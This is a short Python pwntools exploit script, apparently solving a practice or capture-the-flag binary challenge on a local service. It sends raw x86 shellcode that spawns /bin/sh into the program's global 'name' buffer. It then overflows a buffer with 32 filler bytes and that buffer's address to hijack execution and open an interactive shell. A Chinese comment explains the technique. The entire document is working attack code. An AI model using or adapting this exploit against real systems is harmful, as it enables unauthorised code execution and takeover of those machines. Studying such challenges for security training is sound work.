#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# host = "10.211.55.28"
host = "127.0.0.1"
port = 8888

r = remote(host,port)
name = 0x804a060
r.recvuntil(":")
# 将shellcode 存储在程序的全局变量区域的name变量中，留待后面溢出后覆盖eip指向shellcode
# r.sendline(asm(shellcraft.sh())) # test ok
r.sendline("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80") # test OK
r.recvuntil(":")
payload = "a"*32
payload += p32(name)
r.sendline(payload)

r.interactive()
